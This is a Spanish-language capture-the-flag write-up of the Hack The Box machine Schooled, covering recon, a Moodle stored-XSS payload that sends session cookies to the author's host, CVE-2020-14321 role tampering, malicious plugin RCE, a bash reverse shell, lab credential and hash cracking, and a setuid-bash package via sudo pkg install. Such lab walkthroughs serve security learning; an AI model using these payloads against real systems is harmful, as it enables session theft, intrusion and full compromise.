---
title: Schooled WriteUp
date: 2023-06-05
categories: [WriteUps, Máquinas Linux]
tags: [XSS, sudo, Transferencia Archivos]
image:
  path: ../../assets/img/writeups/Schooled/schooled.jpeg
  width: 528
  height: 340
  alt: Banner Schooled
---

Paxaa peñaa!!. Hoy traigo la máquina Schooled. Así en resumen; Nos registramos en el Moodle, mediante un ataque XSS robamos las cookies de sesión de un profesor, pasamos a la cuenta del profe. Debido a un otra vulnerabilidad del moodle tipo IDors podemos operar como otra usuaria, la administradora. Ya siendo administradora quiero instalar un plugin maliciosa-una de las maneras de conseguir RCE en Moodle-. De primeras, a pesar de ser admin, no tenemos permiso para subir plugin, mediante un Mass Assigment Attack conseguimos el permiso, subimos el plugin y ya con RCE nos mandamos una reverse.

Escalada: En un fichero de configuración de la web tenemos una contraseña para la base de datos, en la base de datos tenemos el hash del usuario jamie, la crackeamos y cambiamos de usuario. Este usuario tiene permiso de sudo en el comando pkg install, este comando es vulnerable a escalada con el permiso sudo.

## Reconocimiento

Hola gente!. La máquina que haremos se llama Schooled y tiene la ip `10.10.10.234`. Comprobemos que tenemos conectividad con la máquina (antes de esto hay que conectarse a la vpn de hack the box).
```
❯ ping -c 1 10.10.10.234
PING 10.10.10.234 (10.10.10.234) 56(84) bytes of data.
64 bytes from 10.10.10.234: icmp_seq=1 ttl=63 time=44.1 ms

--- 10.10.10.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.108/44.108/44.108/0.000 ms
```
Un paquete envíado, un paquete recibido, bien.

Escanaremos los puertos de la máquinita:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.234 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-05 11:04 CEST
Initiating SYN Stealth Scan at 11:04
Scanning 10.10.10.234 [65535 ports]
Discovered open port 22/tcp on 10.10.10.234
Discovered open port 80/tcp on 10.10.10.234
Discovered open port 33060/tcp on 10.10.10.234
Completed SYN Stealth Scan at 11:05, 25.74s elapsed (65535 total ports)
Nmap scan report for 10.10.10.234
Host is up, received user-set (0.044s latency).
Scanned at 2023-06-05 11:04:41 CEST for 25s
Not shown: 60332 filtered tcp ports (no-response), 5200 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
33060/tcp open  mysqlx  syn-ack ttl 63
```
Nos saca como abiertos los puertos 22, 80 y 33060.  

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.234 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Escaneamos algo más esos puertos:
```
❯ nmap -p22,80,33060 -sC -sV 10.10.10.234 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-05 11:07 CEST
Nmap scan report for 10.10.10.234
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
| http-methods: 
|_  Potentially risky methods: TRACE
33060/tcp open  mysqlx?
| fingerprint-strings: 
(y sigue...)
```
* -sC : Lanza unos scrips básicos de reconocimiento.
* -sV : Para averiguar la versión de los servicios.

Así que tenemos los puertos 22/ssh, 80/http y 33060/mysql.

## Buscando vulnerabilidades

Ni por el puerto ssh ni por el de mysql tengo credenciales, podría hacer ataques de fuerza bruta pero prefiero ir primero vía http. Así que empecemos por el puerto 80.  
Uso herramienta whatweb para saber las tecnologías que corren por detrás de la página:
```
❯ whatweb http://10.10.10.234

http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```
Vemos el dominio en un correo; **schooled.htb**, hay que añadirlo al /etc/host para poder apuntar a él.
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.10.234  schooled.htb
```
Echemos un vistazo a la web. Tanto con la ip como con el dominio encontrado. Tanto si pongo la ip en la url como si pongo el dominio la página es la misma:

![Web]({{ 'assets/img/writeups/Schooled/web.png' | relative_url }}){: .center-image }

Hay una opción de contacto que permite el imput. Pruebo a meter cualquier cosa y me salta la página de "Noy Found". Tiene pinta de no estar funcionando esta sección de contacto de la página.

Voy a realizar fuzzing por subdirectorios. Sabiendo que hay php por detrás(en el whatweb salió por ejemplo) después haré una búsqueda por extensioes php.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.234/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.234/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        461 L    1555 W     20750 Ch    "# directory-list-2.3-medium.txt"                                                                                      
000000007:   200        461 L    1555 W     20750 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                                                           
000000013:   200        461 L    1555 W     20750 Ch    "#"                                                                                                                    
000000003:   200        461 L    1555 W     20750 Ch    "# Copyright 2007 James Fisher"                                                                                        
000000016:   301        7 L      20 W       235 Ch      "images"                                                                                                               
000000014:   200        461 L    1555 W     20750 Ch    "http://10.10.10.234/"                                                                                                 
000000006:   200        461 L    1555 W     20750 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000009:   200        461 L    1555 W     20750 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000010:   200        461 L    1555 W     20750 Ch    "#"                                                                                                                    
000000011:   200        461 L    1555 W     20750 Ch    "# Priority ordered case-sensitive list, where entries were found"                                                     
000000550:   301        7 L      20 W       232 Ch      "css"                                                                                                                  
000000008:   200        461 L    1555 W     20750 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000005:   200        461 L    1555 W     20750 Ch    "# This work is licensed under the Creative Commons"                                                                                                                                                                                     
000000953:   301        7 L      20 W       231 Ch      "js"                                                                                                                   
000002771:   301        7 L      20 W       234 Ch      "fonts"                
```
Encontramos los subdirectorios image, js, fonts y css. Echo un vistazo por encima y no atisbo nada interesante. Sigamos con el fuzzing, esta vez por extensiones txt y php peeero no encuentra nada:
``` 
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://10.10.10.234/FUZZ.FUZ2Z

(Lo dicho, no encuentra nada)
```
Tenemos un subdominio, que es schooled.htb, podemos buscar subdominios tanto con la herramienta wfuzz como con gobuser, para subdominios personalmene me gusta más la segunda:
```
❯ gobuster vhost -u http://schooled.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://schooled.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/05 11:51:52 Starting gobuster in VHOST enumeration mode
===============================================================
Found: moodle.schooled.htb (Status: 200) [Size: 84]
``` 
Encontramos el subdominio moodle.schooled.htb. Lo añadimos al /etc/host y nos metemos a lo que tiene pinta de ser un moodle:
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.10.234  schooled.htb  moodle.schooled.htb
``` 

![Moodle]({{ 'assets/img/writeups/Schooled/moodle.png' | relative_url }}){: .center-image }

No se ve en la foto pero arriba a la derecha hay una opción de "log in". Dandole a cualquier asignatura te lleva a ese panel de login, en el cual hay una opción de crear nueva cuenta "Create new account".

![Register]({{ 'assets/img/writeups/Schooled/register.png' | relative_url }}){: .center-image }

El correo tenía que ser con ese dominio final. Estamos dentro del panel:

![Panel]({{ 'assets/img/writeups/Schooled/panel.png' | relative_url }}){: .center-image }

Parece que en la asignatura de Matemáticas puedo inscribirme "enrol me", en el resto no. Me inscribo y puedo visualizar algunos temas propios de las mates(cálculo, geometría, etc) y también sale un lugar de anuncios o comunicaciones "announcements". Entro y salen dos anuncios, el primero "Reminder for joining students" es interesane y puede que sea una pista. El mensaje dice esto:  
"This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.

Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.

Look forward to seeing you all soon."

Básicamente que el profe revisará nuestro perfil. Lo que me lleva a pensar que hay posibilidad de un ataque XSS ó Cross-site scripting; es una vulnerabilidad de seguridad que permite a un atacante inyectar en un sitio web código malicioso del lado del cliente. Este código es ejecutado por las víctimas y permite a los atacante eludir los controles de acceso y hacerse pasar por usuarios. Normalmente es código Javascript.

## Explotación

El objetivo es que cuando el profesor entre en nuestro perfil se cargará una instrucción que nosotras hayamos puesto.

Entro a nuestro perfil y me fijo en los inputs que se reflejan, los que se ven como por ejemplo el nombre y el apellido, voy a editar mi perfil y cambiar esos campos por inyecciones xss, probaré primero con:
```
<script>alert("probando")</script>
```
![XSS1]({{ 'assets/img/writeups/Schooled/xss1.png' | relative_url }}){: .center-image }

Se quita el script y sale el alert, normalmente con el alert sale una ventana emergente, pero que se haya quitado la parte de script es buena señal.

Observando un poco mejor el perfil veo justo el campo que ponía en el mensaje el profesor **MoodleNet profil**  e inyecto el payload en ese punto:

![XSS2]({{ 'assets/img/writeups/Schooled/xss2.png' | relative_url }}){: .center-image }

Funciona!. Hay una vulnerabilidad XSS en la web:

![FuncionaXSS]({{ 'assets/img/writeups/Schooled/xssfunciona.png' | relative_url }}){: .center-image }

Una vez que sabemos que es vulnerable lo próximo a lo que aspiramos es a conseguir robar la cookie de el usuario que vaya a visitar nuestro perfil, que es al que se le cargará la instrucción, en este caso el profesor de Matemáticas.

En vez del payload anterior en el campo MoodleNet profil voy a meter este:
```
<script>document.location=”http://MiIp/?cookie=”+document.cookie></script>
```
Antes de eso en mi terminal me abro un servidor con python:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
No me llega nada.. Voy a probar con algo más simple:
``` 
<script src=”http://miIp/recurso.js"></script>
``` 
Por si funciona voy a creearme ya ese recurso.js:
``` js
var request = new XMLHttpRequest();
request.open(‘GET’, ‘http://MiIp/?cookie=’ + document.cookie);
request.send();
```
Y desde el servidor en escucha me llegan las peticiones con las cookies:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.16 - - [05/Jun/2023 18:19:02] "GET /recurso.js HTTP/1.1" 200 -
10.10.14.16 - - [05/Jun/2023 18:25:11] "GET /recurso.js HTTP/1.1" 200 -
10.10.14.16 - - [05/Jun/2023 18:25:12] "GET /?cookie=MoodleSession=lvssjmm400o1qdrg5nruab46me HTTP/1.1" 200 -
10.10.10.234 - - [05/Jun/2023 18:26:48] "GET /recurso.js HTTP/1.1" 200 -
10.10.10.234 - - [05/Jun/2023 18:26:48] "GET /?cookie=MoodleSession=d1bi0s7elee7841nnetf2ks4uf HTTP/1.1" 200 -
```
Primero llega mi cookie porque al recargar la página estoy enviando mi propia cookie, yo soy el usuario que lo está cargando y viendo. La segunda cookie ya viene de la ip objetivo, que será la del profe.

Entro a la consola del navegador (Ctrl + Shift + C) e inserto esa nueva cookie:

![Cookie]({{ 'assets/img/writeups/Schooled/insertCookie.png' | relative_url }}){: .center-image }

Recargo la página y me convierto en Manuel Philips -saldrá arriba a la derecha-.

Se podría decir que he realizado una escalada dentro del programa Moodle.

Voy a buscar algo nuevo que pueda hacer con el usuario profesor. Así de primeras algo de nuevo habrá pero no lo encuentro. Quiero averiguar la versión del moodle para buscar vulnerabilidad concreta pero no hay manera. Así que voy a buscar con searchsploit y ya eligiré una u otra:
```
❯ searchsploit moodle
```
Hay bastantes, ¿Cual elijo?, de las más nuevas y con mayor vulnerabilidad, por ejemplo esta; **Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)** que corresponde al script 50180.py. ¡Por cierto, el autor es lanz!, un conocido de la comunidad, está en todo el tio. Es un script basado en este CVE; https://github.com/HoangKien1020/CVE-2020-14321  
Y el del propio lanz está también en github: https://github.com/lanzt/CVE-2020-14321/

Siempre que esta en github prefiero verlo desde allí, te dan más explicaciones y está más bonito y organizado. Podríamos usar cualquiera de los dos, pero prefiero hacerlo de modo manual porque se aprende algo más.

¿En qué consiste el exploit o cual es la vulnerabildad que explotaremos?:  

Primero encontramos la siguiente vulnerabilidad; https://moodle.org/mod/forum/discuss.php?d=407393#p1644268. Permite escalar privilegios dentro del moodle. Una siendo Manuel Philips vas a tu asignatura que es Mathematics, a Participants (menu de la izquierda) y **Enrol Users**. Ahora bien tenemos que pasar por bursuite esta petición; Añadimos a la usuaria Lian Carter, porque en la web principal se veía en las fotos que ocupaba puesto de Manager y le damos a enrol users.

Dentro del burpsuite, paso la petición al repeater y para verlo mejor voy a la columna de la derecha y despliego opción de **Request Query Parameter**. Veremos esto:
```
mform_showmore_main=0
id=5
action=enrol
enrolid=10
sesskey=ktedRklKlg
_qf__enrol_manual_enrol_users_form=1
mform_showmore_id_main=0
userlist%5B%5D=25
roletoassign=5
startdate=4
```
Cambio el userlist por 24, porque mi id es 24, se puede ver en el perfil de Manuel. Y cambio roletoassign a 1 , porque deduzco que el 1 es el manager/admin. Envío la petición.  
Vuelvo a enrol users y esta vez sin interceptar petición con burp añado a Lian Carter de nuevo. Me meto en su usuario( estará abajo en la lista de participanes del curso). Y se habrá añadido la opción **"Log in as"**. Le doy ahí, luego a "continuar" y ahora seremos la usuaria Lian que tiene permisos de administradora. 

Una de las formas de conseguir RCE en moodle es a partir del usuario administrador conseguir subir un plugin que, por supuesto, es vulnerable. Lo que pasa es que a pesar de ser la admin no tenemos la opción de subir plugins.  
Abajo del todo izquierda tenemos la nueva opción "Site Administrator". Si vamos al apartado Plugins no se ve la opción de subir plugin. Para solucionar esto vamos a aprovecharnos del tipo de ataque llamado **Mass Assigment Attack**, consiste en una asignación masiva de permisos, añadiremos campos y valores que no deberiamos saber y nos otorgan distintos privilegios, entre ellos el de subir plugins. Para ello nos iremos a una de las páginas nombradas antes; https://github.com/HoangKien1020/CVE-2020-14321 

En Users --> Permissions --> Define Role --> Manager --> Edit --> Y ahora interceptaremos la petición antes de dar a "Save" --> Save

Añadiremos el payload del github de HoanKien1020 y "Send" en el burp.  
Ahora si volvemos al apartado plugins podemos subir. Subiremos el que tenemos en el mismo repositorio, el rce.zip.

Una vez subido en la url metemos esta ruta con el comando que queramos, en mi caso para probar `id`:
```
http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
```
![RCE]({{ 'assets/img/writeups/Schooled/rce.png' | relative_url }}){: .center-image }

Y ahora cambio ese id por `bash -c "bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261"`

Y consigo entrar. Puede que tengas que volver a instalar el plugin porque lo borra automáticamente pasado un corto tiempo.

## Escalada de privilegios

Soy el usuario www:
```
whoami
www
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ 
```
Voy a echar unos directorios para atrás y revisar la ruta moodle para husmear archivos interesantes como alguno de configuración.
```
ls -l | grep conf
-rwxr-xr-x   1 www  www   55434 Jun 13  2020 config-dist.php
-rwxr-xr-x   1 www  www     758 Dec 19  2020 config.php
cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
```
Tenemos credenciales de acceso a la base de datos:  
UserDB: moodle
PasswordDB: PlaybookMaster2020

Antes de conectarnos miro que usuarios hay en home y están:
``` 
ls /home
jamie
steve
```
Tenemos problemas al conectar al mysql-no encuentra el comando- porque no está dentro del PATH, añado mi path (de máquina local) a esta máquina:
```
export PATH=/root/.local/bin:/snap/bin:/usr/share/fonts:/usr/local/share/fonts:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ahora si, podemos conectarnos y mirar las bases de datos:
```
mysql -umoodle -pPlaybookMaster2020 -e 'show databases'

mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
moodle
mysql -umoodle -pPlaybookMaster2020 -e 'show tables' moodle
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_moodle
mdl_analytics_indicator_calc
mdl_analytics_models
mdl_analytics_models_log
Y más ...
```
La que me convence es mdl_user.
```
mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle

mysql: [Warning] Using a password on the command line interface can be insecure.
Field	Type	Null	Key	Default	Extra
id	bigint	NO	PRI	NULL	auto_increment
auth	varchar(20)	NO	MUL	manual	
confirmed	tinyint(1)	NO	MUL	0	
policyagreed	tinyint(1)	NO		0	
deleted	tinyint(1)	NO	MUL	0	
suspended	tinyint(1)	NO		0	
mnethostid	bigint	NO	MUL	0	
username	varchar(100)	NO			
password	varchar(255)	NO		
Y más ...	
```
Sacaremos la data de los campos username y password:
```
mysql -umoodle -pPlaybookMaster2020 -e 'select username,password from mdl_user' moodle

mysql: [Warning] Using a password on the command line interface can be insecure.
username	password
guest	$2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
admin	$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
bell_oliver89	$2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
orchid_sheila89	$2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
chard_ellzabeth89	$2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
morris_jake89	$2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
heel_james89	$2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
Y más...
```
Voy a coger el hash del admin, si estuvieran también los de Jamie y Steve, los que se encuentran en el home, también los guardaría.

Guardaré el hash en mi terminal en un fichero que llamaré hash.hash:
```
admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
```
Y lo crackearé. Lo puedo hacer tanto con la herramienta john como con hashcat.
```
> hashcat -m 3200 hash.hash --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
La contraseña es: **!QAZ2wsx**

Opciones:  
-m: Del modo a utilizar. Luego explico el porqué del 3200.
--user: Porque dentro del fichero he indicado el usuario. Esa opción es para que lo ignore.
-a 0: Indica el tipo de ataque de Fuerza Bruta. No lo he puesto porque por defecto es este.

¿Como sé que es el modo 3200?:
```
❯ hashcat --example-hashes | grep -oP '\$2\w\$'
$2a$
$23$
$23$
$23$

(Me quedo con la primera que es la más parecida)

❯ hashcat --example-hashes | grep \$2a\$\* -B 5
HASH: 792FCB0AE31D8489:7284616727
PASS: hashcat

MODE: 3200
TYPE: bcrypt $2*$, Blowfish (Unix)
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
```
En MODE sale el modo. Cuidadín que con las opciones -oP para expresiones regulares no tengo la opción luego de ver líneas de arriba/antes (-A), de después (-B), tanto de antes como de después(-C).

Los usuarios encontrados en el home de la máquina objetivo eran jamie y steve. Probaré a conectarme con ellos por ssh con la password sacada del crackeo al hash; !QAZ2wsx
```
❯ ssh jamie@10.10.10.234
The authenticity of host '10.10.10.234 (10.10.10.234)' can't be established.
ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.234' (ECDSA) to the list of known hosts.
Password for jamie@Schooled:
Last login: Fri Oct 29 12:35:59 2021 from 10.10.14.23
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

jamie@Schooled:~ $ id
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
jamie@Schooled:~ $ pwd
/home/jamie
jamie@Schooled:~ $ cat user.txt
a40c980de1e8422cc6077482*****
```
Y tenemos la primera flag!!!

## Escalada de privilegios

```
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
Resulta que para pkg install tenemos una vía para escalar privilegios:  
https://gtfobins.github.io/gtfobins/pkg/

Según lo indicado habrá que usar fpm, que no tengo instalado, lo instalaré:
```
> apt install fpm
```
Después de unos cuantos errores con la herramienta que solucioné gracias a los issues de github, gracias gente!. Pude crear el paquete necesaria para la escalada:
```
❯ TF=$(mktemp -d)

echo 'chmod u+s /usr/local/bin/bash' > $TF/x.sh

/opt/fpm/fpm-1.15.1/bin/fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}

> ls
-rw-r--r-- 1 root root 504 jun  7 11:14 x-1.0.txz
```
Hay que pasar ese paquete a la máquina objetivo. Me pongo en escucha:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [07/Jun/2023 11:23:43] "GET /x-1.0.txz HTTP/1.1" 200 -
```
Desde la máquina víctima:
```
jamie@Schooled:~ $ curl http://10.10.14.8/x-1.0.txz --output x-1.0.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   504  100   504    0     0   2625      0 --:--:-- --:--:-- --:--:--  2625
jamie@Schooled:~ $ ls
user.txt	x-1.0.txz
```
Y señoras y señores queda una línea de comando para convertirnos en root. Recordar que simplemente hemos seguido lo que ponía en gftobins sobre ese comando que teníamos permiso de sudo.

![fpm]({{ 'assets/img/writeups/Schooled/fpmsudo.png' | relative_url }}){: .center-image }

```
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
	x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
Extracting x-1.0: 100%
jamie@Schooled:~ $ ls -l /usr/local/bin/bash
-rwsr-xr-x  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
jamie@Schooled:~ $ bash -p
[jamie@Schooled ~]# id
uid=1001(jamie) gid=1001(jamie) euid=0(root) groups=1001(jamie),0(wheel)
[jamie@Schooled ~]# cat /root/root.txt
4c8ab8c47009b36964752738*******
```
A pesar de esos errores del principio que podrían asustar parece que funciona, no parece, funciona. Nos hemos convertido en root y podemos leer la última flag.